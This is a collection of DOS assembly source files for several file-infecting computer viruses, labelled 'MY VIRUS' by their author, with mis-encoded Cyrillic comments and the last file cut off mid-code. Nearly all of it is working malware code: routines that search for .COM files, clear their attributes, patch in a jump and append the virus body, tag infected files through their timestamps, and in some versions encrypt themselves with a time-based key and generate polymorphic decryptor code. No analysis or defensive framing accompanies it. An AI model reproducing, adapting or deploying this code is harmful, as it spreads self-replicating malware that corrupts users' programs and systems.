        Mov     Bl,02h
        Div     Bl
        Xor     Ah,Ah
        Mov     byte ptr [Bp]+b_reg,Al
        Push    Si
        Lea     Si,tabl+[Bp]
        Call    mreg    ; è‡ÆÊ•§„‡† ®Ì¨•≠•≠®Ô °†ßÆ¢ÎÂ ‡•£®·‚‡Æ¢ ¢ ‚†°´®Ê•
        Pop     Si
        Mov     ax,word ptr [Si]+01
        Cmp     al,00h
        Jnz     no
        Inc     Ax
no:
        Cmp     byte ptr [Si],00h
        Jnz     mo
        Inc     byte ptr [Si]
mo:
        Xor     Ah,Ah
        Mov     Bl,02h
        Div     Bl
        Xor     Ah,Ah
        Inc     Al
        Mov     byte ptr [Bp+n_com],Al
        Xchg    Cx,Ax
        Mov     Ax,word ptr [Bp+seg_new]
        Mov     Es,Ax
        Xor     Ch,Ch
        Xor     Ax,Ax
        Mov     Di,0003h
        Xor     Bx,Bx
        Mov     Dx,24d
Cycle:
        Call    Comp    ; É•≠•‡†Ê®Ô ØÆ·´•§Æ¢†‚•´Ï≠Æ·‚® ™Æ¨†≠§
        Inc     Si
        Add     Bx,0003h
        Sub     Dx,0003h
        Loop    Cycle
        Push    Cs
        Pop     Es
        Jmp     Virus
;------ èÆ§Ø‡Æ£‡†¨¨Î ----------------------------------------------------------
Comp:
        Cmp     byte ptr [Si],00h
        Jnz     Set_0
        Mov     Al,00d
        Jmp     vit
Set_0:
        Cmp     byte ptr [Si],01h
        Jnz     Set_1
        Mov     Al,03d
        Jmp     vit
Set_1:
        Cmp     byte ptr [Si],02h
        Jnz     Set_2
        Mov     Al,06d
        Jmp     vit
Set_2:
        Cmp     byte ptr [Si],03h
        Jnz     Set_3
        Mov     Al,09d
        Jmp     vit
Set_3:
        Cmp     byte ptr [Si],04h
        Jnz     Set_4
        Mov     Al,12d
        Jmp     vit
Set_4:
        Cmp     byte ptr [Si],05h
        Jnz     Set_5
        Mov     Al,15h
        Jmp     vit
Set_5:
        Cmp     byte ptr [Si],06h
        Jnz     Set_6
        Mov     Al,18d
        Jmp     vit
Set_6:
        Cmp     byte ptr [Si],07h
        Jnz     Set_7
        Mov     Al,21d
        Jmp     vit
Set_7:
        Cmp     byte ptr [Si],08h
        Jnz     Set_8
        Mov     Al,21d
        Jmp     vit
Set_8:
        Cmp     byte ptr [Si],09h
        Jnz     Set_9
        Mov     Al,18d
        Jmp     vit
Set_9:
        Cmp     byte ptr [Si],0ah
        Jnz     Set_a
        Mov     Al,15d
        Jmp     vit
Set_a:
        Cmp     byte ptr [Si],0bh
        Jnz     Set_b
        Mov     Al,12d
        Jmp     vit
Set_b:
        Cmp     byte ptr [Si],0ch
        Jnz     Set_c
        Mov     Al,09d
        Jmp     vit
Set_c:
        Cmp     byte ptr [Si],0dh
        Jnz     Set_d
        Mov     Al,06d
        Jmp     vit
Set_d:
        Cmp     byte ptr [Si],0eh
        Jnz     Set_e
        Mov     Al,03d
        Jmp     vit
Set_e:
        Cmp     byte ptr [Si],0fh
        Jnz     Set_f
        Mov     Al,00h
        Jmp     vit
Set_f:
        Jmp     rt

set:
        Rol Ax,Cl
        Xor Ah,Ah
        Div Ch
        Mov byte ptr [Si]+[Bx],Al
        Inc Bx
        Ret
Mes:
        Push    Dx
        Mov     Ah,09h
        Lea     Dx,Cop+[Bp]
        Int     21h
        Pop     Dx
        Ret

ort:	Movsb
        Movsw
        ret
res:	Cmp     Al,09h
        Jnz     d1
        Mov     Al,0ch
        Ret
d1:	Cmp     Al,0ch
        Jnz     d2
        Mov     Al,09h
        Ret
d2:	Cmp     Al,12h
        Jnz     d3
        Mov     Al,15h
        Ret
d3:	Cmp     Al,15h
        Jnz     d4
        Mov     Al,12h
d4:	Ret

rand:	push    Ax
        Mov     ch,10h
        Xor     Cl,Cl
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,04h
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,08h
        Call    set
        Pop     Ax
        Push    Ax
        Mov     Cl,0ch
        Call    set
        Pop     Ax
        Ret

R_Vec24        PROC
                Push    word ptr Vec24+[Bp]
                Pop     Ds
                Mov     Dx,word ptr Vec24+[Bp]+2
                Mov     Ax,2524h
                Int     21h
                Ret
R_Vec24        ENDP

Set_Int_24:     Push    Ds
                Push    Bx
                Push    Dx
                Mov     Ax,3524h
                Int     21h
                Mov     word ptr Vec24+[Bp]+2,Bx
                Mov     word ptr Vec24+[Bp],Es
                Push    Cs
                Pop     Ds
                Mov     Ax,2524h
                Lea     Dx,intr24+[Bp]
                Int     21h
                Pop     Dx
                Pop     Bx
                Pop     Ds
                Ret

;Intr21        PROC
;       db      09ah
;       vector  dd      ?
;               ret
;Intr21        ENDP

Intr24:
        Mov     Al,3h
        Iret

vit:
        Push    Si
        Push    Di
        Push    Si
        Lea     Si,tabl+[Bp]
        Add     Si,Ax
        Add     Di,Bx
        Call    ort
        Pop     Si
        Pop     Di
        Call    res
        Push    Di
        Push    Si
        Lea     Si,tabl+[Bp]
        Add     Si,Ax
        Mov     Di,800h ;-------------------------??????????
        Add     Di,Dx
        Call    ort
        Pop     Si
        Pop     Di
        Pop     Si
        Ret
mreg:
        Cmp     Al,01h
        Jnz     q1
        Jmp     Bx_r
q1:
        Cmp     Al,02h
        Jnz     Si_r
Di_r:
        Mov     byte ptr [Si]+04h,15h
        Mov     byte ptr [Si]+07h,35h
        Mov     byte ptr [Si]+0ah,05h
        Mov     byte ptr [Si]+0dh,0dh
        Mov     byte ptr [Si]+10h,1dh
        Mov     byte ptr [Si]+13h,05h
        Mov     byte ptr [Si]+16h,2dh
        Mov     byte ptr [Si]+18h,0bfh
        Mov     byte ptr [Si]+1bh,47h
        Mov     byte ptr [Si]+1dh,0ffh
        Ret
Si_r:
        Mov     byte ptr [Si]+04h,14h
        Mov     byte ptr [Si]+07h,34h
        Mov     byte ptr [Si]+0ah,04h
        Mov     byte ptr [Si]+0dh,0ch
        Mov     byte ptr [Si]+10h,1ch
        Mov     byte ptr [Si]+13h,04h
        Mov     byte ptr [Si]+16h,2ch
        Mov     byte ptr [Si]+18h,0beh
        Mov     byte ptr [Si]+1bh,46h
        Mov     byte ptr [Si]+1dh,0feh
        Ret
Bx_r:
        Mov     byte ptr [Si]+04h,17h
        Mov     byte ptr [Si]+07h,37h
        Mov     byte ptr [Si]+0ah,07h
        Mov     byte ptr [Si]+0dh,0fh
        Mov     byte ptr [Si]+10h,1fh
        Mov     byte ptr [Si]+13h,07h
        Mov     byte ptr [Si]+16h,2fh
        Mov     byte ptr [Si]+18h,0bbh
        Mov     byte ptr [Si]+1bh,43h
        Mov     byte ptr [Si]+1dh,0fbh
        Ret

G_gar:
        Push    Dx
        Push    Cs
        Pop     Es
        Mov     Cx,Dx
        Shr     Cx,08
        Shl     Cl,04
        Mov     Ax,Cx
        Mov     Cx,Dx
        Shl     Cx,08
        Xchg    Ch,Cl
        Rol     Cl,04
        Shr     Cl,04
        Add     Cx,Ax
        Jp      l1
        Dec     Cx
        Jp      l1
        Dec     Cx
L1:
        Mov     Ax,Cx
        Mov     word ptr [Bp]+gar,Al
        Mov     Bl,2
        Div     Bl
        Xor     Ah,Ah
        Xchg    Ax,Cx
        Pop     Dx
        Push    Dx
        Lea     Di,konec+[Bp]+2
        Cld
cyl:
        Call    trash
        StoSw
        Add     Dx,0bedah
        Loop    cyl
        Dec     Di
        Dec     Di
        Mov     Ax,9090h
        StoSw
        Pop     Dx
        Ret
trash:
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 1 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot:   Shr     Bx,8
        Shr     Bx,4
        Rol     Bl,4
        Cmp     Bl,00h
        Jz      n1
        Cmp     Bl,10h
        Jz      n1
        Cmp     Bl,20h
        Jz      n1
        Cmp     Bl,30h
        Jz      n1
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot
n1:     Mov     Al,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 2 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
anot1:  Rol     Bx,4
        Shr     Bx,8
        Shr     Bx,4
        Cmp     Bl,2
        Jz      n2
        Cmp     Bl,4
        Jz      n2
        Cmp     Bl,10
        Jz      n2
        Cmp     Bl,11
        Jz      n2
        Cmp     Bl,12
        Jz      n2
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot1
n2:     Add     Al,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 3 }ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot2:  Shr     Bx,8
        Shr     Bl,4
        Shl     Bl,4
        Cmp     Bl,00h
        Jz      n3
        Cmp     Bl,10h
        Jz      n3
        Cmp     Bl,20h
        Jz      n3
        Cmp     Bl,30h
        Jz      n3
        Cmp     Bl,0c0h
        Jz      n3
        Cmp     Bl,0d0h
        Jz      n3
        Cmp     Bl,0f0h
        Jz      n3
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     anot2
n3:     Mov     Ah,Bl
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ{ 4 }ƒƒƒƒƒƒƒƒƒƒƒ¥
        Mov     Bx,Dx
Anot3:  Shl     Bx,8
        Shl     Bh,4
        Ror     Bh,4
        Cmp     Bh,6
        Jnz     n4
        Cmp     Bh,12
        Jnz     n4
        Cmp     Bh,14
        Jnz     n4
        Sub     Dx,2222h
        Mov     Bx,Dx
        Jmp     Anot3
n4:     Add     Ah,Bh
        ret
gkey:
        Push    Dx
        Mov     [Si]+8h,Dl
        Mov     [Si]+0bh,Dh
        Mov     [Si]+0eh,Dh
        Add     Dh,Dl
        Mov     [Si]+14h,Dh
        Mov     [Si]+17h,Dh
        Pop     Dx
        Ret

;**************************************************** VIRUS START *************
Virus:
        Mov     ah,1ah
        Lea     Si,vir+[Bp]
        Mov     Dx,Si
        Add     Dx,0dh
        Int     21h
        Mov     Dx,Si
        Inc	Dx	;Add     dx,1h
find_f:
        Mov     ah,4eh
        Xor     Cx,Cx
        Int     21h
        jmp     ok
find_n:
        Mov     ah,4fh
        Int     21h

ok:
        jnb     chk
        cmp     al,12h
        jz      dg
        jmp     chk
dg:
        cmp     byte ptr [Bp]+dir,0ffh
        jnz     fg
        jmp     rt
fg:
        dec     dx
        Mov     byte ptr [Bp]+dir,0ffh
        jmp     find_f

chk:
        Mov     cx,[Bp]+offset date
        and     cx,001ah
        cmp     cx,001ah
        jz      find_n
        cmp     word ptr dlina+[Bp],62000d
        ja      find_n
        cmp     word ptr dlina+[Bp],0100h
        jb      find_n
        push    si
        Mov     di,si
        Add     di,0dh
        Add     si,02bh
        cmp     byte ptr [Bp]+dir,0ffh
        jnz     nam
        Mov     al,5ch
        stosb
nam:
        lodsb
        stosb
        cmp     al,00
        jnz     nam
        pop     Si
        Mov     dx,si
        Add     dx,00dh
        Mov     Cx,[Bp]+offset atrib
        Xor     Ch,Ch
        and     cx,0fffeh
        Mov     ax,4301h
        Int     21h
        Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
        Sub     ax,0003h
        Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
        Mov     al,02h
        Mov     ah,3dh
        Int     21h
        jnb     ar
        jmp     rt
ar:
        Mov     bx,ax
        Mov     ax,4200h
        Xor	Cx,Cx
	Cwd	;        Xor     Dx,Dx
        Int     21h
        Mov     ah,3fh
        Mov     cx,0003h
        Lea     dx,buf_j+[Bp]
        Int     21h
        Mov     Di,offset buf_j+[Bp]
        Cmp     Di,'ZM'
        Jnz     infect
        Mov     Ah,3eh
        Int     21h
        Jmp     find_n
infect:
        Lea     Si,virn+[Bp]
        Mov     Di,22h
        Push    word ptr seg_new+[Bp]
        Pop     Es
        Mov     Cx,cod2_lng
        Rep     Movsb
        Mov     ax,4200h
        Xor     cx,cx
	Cwd	;        Xor     dx,dx
        Int     21h
        Mov     ah,40h
        Mov     cx,0003h
        Lea     Dx,new_j+[Bp]
        Int     21h
        Mov     ah,42h
        Mov     al,02h
        Xor     Cx,Cx
	Cwd	;	Xor     Dx,Dx
        Int     21h
        Mov     Ah,40h
        Lea     Dx,konec+[Bp]+2
        Mov     Cx,word ptr gar+[Bp]
        Dec     Cx
        Xor     Ch,Ch
        Int     21h
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
        Mov     Ah,2ch  ;          \
        Int     21h     ;            \
        Push    Ds      ;              \
        Mov     Cx,(Cod2_Lng /2d)-20h ;  \
        Mov     Si,8ah          ;          \
        Mov     Es:[23h],Dx ;                \
My:                             ;              >---------> 1-Ô á†Ë®‰‡Æ¢™†
        Xor     word ptr Es:[Si],Dx ;        /
        Inc     Si                  ;      /
        Sub     Dx,0DEADh	    ;    /
        Inc     Si                 ;   /
        Loop    My                ;  /
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
        Push    Bx
        Xor     Ax,Ax
        Mov     Al,[Bp]+n_com
        Mov     Bl,03h
        Mul     Bl
        Add     Ax,03h
        Mov     word ptr d_dlina+[Bp],Ax
        Lea     Si,M1+[Bp]
        Xor     Di,Di
        MovSb
        Mov     Bx,offset dlina+[Bp]
        Add     Bx,Ax
        Add     Bx,107h
        Add     Bx,word ptr Gar+[Bp]
;================
        Dec     Bx
;================
        Mov     Es:[01h],Bx
        Lea     Si,I1+[Bp]
        Mov     Di,Ax
        Cld
        MovSw
        MovSb
        MovSw
        MovSw
        Add     Bx,lng
        Mov     Si,Ax
        Add     Si,03h
        Mov     Es:[Si],Bx
        Add     Si,03h
        Xor     Bx,Bx
        Sub     Bx,Ax
        Sub     Bx,4h
        Mov     byte ptr Es:[Si],Bl
;-------------------------------
        Pop     Bx
        Lea     Si,gat+[Bp]
        Mov     Di,7fdh
        MovSb
        MovSw
        Sub     Si,0dh
        Mov     Di,800h
        MovSb
        MovSw
        Lea     Si,I1+[Bp]
        Mov     Di,81bh
        MovSw
        MovSb
        MovSw
        MovSw
        Inc     Si
        Inc     Si
        MovSw
        Push    Bx
        Cld
        Call    dword ptr cody+[Bp]
        Pop     Bx
dry:
        Xor     Dx,Dx
        Push    Es
        Pop     Ds

        Mov     Cx,Ax
        Add     Cx,7h
        Mov     ah,40h
        Int     21h
        Mov     cx,cod2_lng
        Mov     Dx,22h
        Mov     ax,4000h
        Int     21h
;-----------------------------------------------------------------------------

        Pop     Ds
        Mov     cx,[Bp]+offset time
        Mov     dx,[Bp]+offset date
        and     dx,0ff0eh
        or      dx,001ah
        Mov     ax,5701h
        Int     21h
        Mov     ah,3eh
        Int     21h

rt      PROC
        Call    R_Vec24
        Mov     Ah,49h
        Push    Es
        Pop     Bx
        Int     21h
        Push    Cs
        Pop     Es
        Push    Es
        Pop     Ds
        Push    100h
        Xor     Ax,Ax
        Xor     Cx,Cx
	Cwd	;        Xor     Dx,Dx
        Xor     Bx,Bx
        Ret
rt      ENDP
sc      ENDP
konec:
lng             =       $-Sc
Cod2_lng        =       $-Virn

END start
END

ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1870.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_352.ASM]ƒƒƒ
;<  MY VIRUS 2 > 

	.MODEL tiny
	.stack
	.code  
	org 100h
start:
       jmp      sc

com_adr		EQU	100h+desc
real_start      EQU     desc
desc            EQU     283d
lng             EQU     352d

sc     PROC 
ha     DB       0BEh,01dh,002h   
	push    si
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;====lengh of file to AX
	push     ax
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	pop      ax 
	add      ax,com_adr ;===adding    
	mov      [si-(desc-01h)],ax ;===for compatabile 
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
	mov     dx,si
	sub     dx,real_start
	mov     cx,lng
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor	ax,ax
	xor	dx,dx
	xor	bx,bx
	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP

vir    DB "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooooooÈoooooo"

END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_352.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_371.ASM]ƒƒƒ
;<  MY VIRUS 1 > 

        .MODEL tiny
        .stack
        .code  
        org 100h
start:
       jmp 	sc
real_start	EQU	desc
desc		EQU	300d
lng		EQU 	371d

sec   PROC
sc     PROC 
ha     DB  	0BEh,02eh,002h   
	push	si
	add	si,38h 
	mov	cx,0003h
	mov	di,100h
	rep movsb
	pop	si
        mov 	ah,1ah
        mov 	dx,si
        add 	dx,000dh
        int 	21h
        mov 	dx,1h
        add 	dx,si
find_f PROC
        mov 	ah,4eh
        mov 	cx,00h
        int 	21h  
find_f ENDP
        jmp 	ok
find_n PROC
        mov 	ah,4fh
        int 	21h
find_n ENDP

ok     PROC
	jnb	chk
	cmp	al,12h
	jz	dg
	jmp	chk
dg     PROC
	cmp	bp,65535d
dg     ENDP
	jnz	fg
	jmp	rt
fg     PROC
	dec	dx
fg     ENDP
	mov	bp,65535d
	jmp	find_f
ok     ENDP

chk    PROC
	mov 	cx,[si+0dh+18h]
	and 	cx,01e0h
	cmp 	cx,01a0h
	jz 	find_n
	cmp 	word ptr [si+0dh+1ah],65000d
	ja 	find_n
	cmp 	word ptr [si+0dh+1ah],100h
	jb 	find_n
	push 	si
	mov 	di,si
	add 	di,0dh 
	add 	si,02bh
	cmp 	bp,65535d
	jnz 	nam
	mov 	al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp 	al,00
	jnz 	nam
	pop 	si
	mov 	dx,si
	add 	dx,00dh
	mov 	ax,4300h
	int 	21h
	mov 	word ptr [si+36h],cx 
	and 	cx,0fffeh
	mov 	ax,4301h
	int 	21h
chk   ENDP       
       mov 	ax,[si+0dh+1ah] ;====lengh of file to AX
       push	ax
       sub	ax,0003h
       mov	[si+3fh],ax ;==========new JMP to virus
       pop	ax 
       add 	ax,desc+100h ;===adding    
       mov 	[si-(desc-01h)],ax ;===for compatabile 
       call 	opn
       call 	zag
       call 	del
       call 	wf
       call 	cls
       call	rt
sc    ENDP

sec   ENDP

cls    PROC
	mov	cx,[si+0dh+34h]
	mov	dx,[si+0dh+36h]
	and	dx,65055d
	or	dx,01a0h
	mov	ax,5701h
	int	21h
        mov 	ah,3eh
        int 	21h
        ret
cls    ENDP

wf     PROC
	mov	dx,si
        sub	dx,real_start
        mov     cx,lng
        mov     ax,4000h
	int     21h                   
	ret
wf     ENDP

zag    PROC 
        mov 	ax,4200h
        mov 	cx,00h
        mov 	dx,00h
        int 	21h
	mov	ah,3fh
	mov	cx,0003h
	mov	dx,si
	add	dx,38h
	int	21h
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	int	21h
        mov 	ax,4000h
        mov 	cx,0003h
        mov 	dx,3eh  
        add 	dx,si        
        int 	21h
        ret
zag    ENDP

opn    PROC
        mov     al,02h               
        mov     ah,3dh
        int     21h                   
	jnb	ar
	jmp	rt
ar     PROC
        mov     bx,ax
ar     ENDP
	mov	ax,5700h
	int	21h
	mov	word ptr [si+0dh+34h],cx
	mov	word ptr [si+0dh+36h],dx
        ret
opn    ENDP

rt     PROC
	mov 	di,0100h
	push 	di
	ret
rt     ENDP

del    PROC
        mov 	ah,42h
        mov 	al,02h
        mov 	cx,00h
        mov 	dx,00d
        int 	21h
        ret
del    ENDP

vir    DB "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooooooÈoooooo"

END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_371.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_393.ASM]ƒƒƒ
;<  MY VIRUS 2 > 

	.MODEL tiny
	.stack
	.code  
	org 100h
start:
       jmp      sc

com_adr		EQU	100h+desc
real_start      EQU     desc
d_lng		EQU	7ch 
desc            EQU     324d
lng             EQU     393d

sc     PROC 
ha     DB       0BEh,046h,002h   
	mov	di,si
	Sub	di,012fh
	Mov	Dx,[Si+3bh]
	Mov	Cx,d_lng
Decod  PROC
	Xor	[Di],Dx	
	Inc	Di
	Inc	Di
Decod  ENDP
	Loop	Decod
	push    si
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;====lengh of file to AX
	push     ax
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	pop      ax 
	add      ax,com_adr ;===adding    
	mov      [si-(desc-01h)],ax ;===for compatabile 
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
Coding PROC
	Mov	Ah,2ch
	Int	21h
	Mov	[Si+3bh],Dx
	Mov	Cx,d_lng
	Mov	Di,Si
	Sub	Di,012fh
Cycl   PROC
	Xor	[Di],Dx
	Inc	Di
	Inc	Di
Cycl   ENDP
	Loop	Cycl
Coding ENDP
	mov     dx,si
	sub     dx,real_start
	mov     cx,lng
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor	ax,ax
	xor	dx,dx
	xor	bx,bx
	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP

vir    DB "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   Èoooooo"

END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_393.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_415.ASM]ƒƒƒ
;<  MY VIRUS 4 > 

	.MODEL tiny
	.386
	.stack
	.code  
	org 100h
start:
       Jmp      sc

com_adr         EQU     100h+desc
real_start      EQU     desc+3h
Dec_l		EQU	38h 
d_lng           EQU     00c3h ;_____-------_____- ?
desc            EQU     22d
lng             EQU     415d

sc     PROC 
	Call	dr
dr     PROC
	Pop	Bp
dr     ENDP
	Mov     Si,Bp
	Add	Si,desc   ;-------------- now !!! if modific. decoder
	Push	Si
	Mov	Dx,0000h
	Mov     Cx,d_lng
Decod  PROC
	Xor     [Si],Dx 
	Inc     Si
	Inc     Si
Decod  ENDP
	Loop    Decod
	Pop	Si
	Jmp	bep
vir    DB      "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   Èooooooooooo
bep    PROC
	push    si
bep    ENDP
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;======lengh of file to AX
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
